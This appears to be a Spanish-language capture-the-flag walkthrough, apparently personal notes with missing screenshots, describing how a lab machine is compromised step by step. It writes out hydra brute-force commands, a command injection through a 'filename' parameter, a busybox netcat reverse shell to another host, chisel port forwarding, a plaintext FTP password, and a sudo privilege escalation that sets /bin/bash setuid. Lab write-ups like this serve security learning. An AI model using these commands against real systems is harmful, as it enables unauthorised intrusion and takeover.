Hacemos el escaneo de nmap:
![[Pasted image 20240511225047.png]]
Y esto corre por el puerto 80:
![[Pasted image 20240511225119.png]]
Hay un icono de una persona donde al hacerle clic saltará un popup:
![[Pasted image 20240511225156.png]]
En este punto podemos hacer fuerza bruta con el parámetro -C de hydra. De tal forma que podremos probar una lista de credenciales en un archivo de texto para probar múltiples combinaciones de nombres de usuario y contraseñas al mismo tiempo:
![[Pasted image 20240512110203.png]]
```hydra
hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -s 80 -f 192.168.0.25 http-get /cards.php
```
Y nos encuentra las credenciales:
![[Pasted image 20240512110226.png]]
Nos la encuentra porque este diccionario es de combinaciones de contraseñas:
![[Pasted image 20240512110253.png]]
Una vez dentro, tenemos el siguiente panel:
![[Pasted image 20240512110324.png]]
Si intentamos colar un comando, vemos que no nos deja:
![[Pasted image 20240512110541.png]]
Podemos mirar el código fuente y vemos que se tramita por POST, de tal forma que la securización funciona por POST, pero quizá si lo cambiamos a GET, podremos bypassear las restricciones:
![[Pasted image 20240512110753.png]]
Vemos que se usa el id filename por POST, pero nosotros con curl podemos llegar a este punto:
```bash
curl -s -X POST "http://192.168.0.25/cards.php?" -d "filename=hola;whoami" --user 'admin:admin12345' | html2text
```
![[Pasted image 20240512111143.png]]
Pero si lo cambiamos a GET, vemos que funciona:
```bash
curl -s -X GET "http://192.168.0.25/cards.php?filename=hola;whoami" --user 'admin:admin12345' | html2text
```
![[Pasted image 20240512111333.png]]
Ahora nos entablamos una reverse shell con la de busybox:
```bash
curl -s -X POST "http://192.168.0.25/cards.php?filename=hola;busybox+nc+192.168.0.20+443+-e+bash" --user 'admin:admin12345' | html2text
```
![[Pasted image 20240512112848.png]]
No obstante, este mismo RCE también podemos conseguirlo con burp suite:
![[Pasted image 20240517120404.png]]
Dentro de /var/www podemos leer el siguiente archivo llamado ftppolicy.txt:
![[Pasted image 20240517105848.png]]
Y ejecutando el comando ss -tuln vemos que el puerto 21 está a la escucha de forma interna:
![[Pasted image 20240517110052.png]]
Nos traemos este puerto con chisel para atacarlo:
```bash
./chisel server --reverse -p 1234
./chisel client 192.168.0.20:1234 R:21
```
![[Pasted image 20240517110607.png]]
Ahora con hydra hacemos el ataque y funciona:
```bash
hydra -l i.cassini -P irene.txt ftp://127.0.0.1
```
![[Pasted image 20240517110723.png]]
Nos autenticamos con esta contraseña:
```bash
i.cassini:1r3n3!$%
```
![[Pasted image 20240517110802.png]]
Ahora, para escalar privilegios, nos encontramos con el binario acr:
![[Pasted image 20240517110827.png]]
Si lo utilizamos, vemos que nos pide pasar un archivo:
![[Pasted image 20240517110916.png]]
Y usando el parámetro --help vemos la ayuda:
![[Pasted image 20240517111049.png]]
Utilizando el siguiente comando podemos leer la flag de root:
```bash
sudo /usr/bin/acr -d /root/root.txt
```
![[Pasted image 20240517111245.png]]
Para escalar privilegios, usaremos también este binario para incrustar un comando malicioso:
```bash
touch Makefile && chmod +x Makefile
echo "chmod 4777 /bin/bash" > Makefile
sudo /usr/bin/acr -r Makefile
bash -p
```
![[Pasted image 20240517111405.png]]
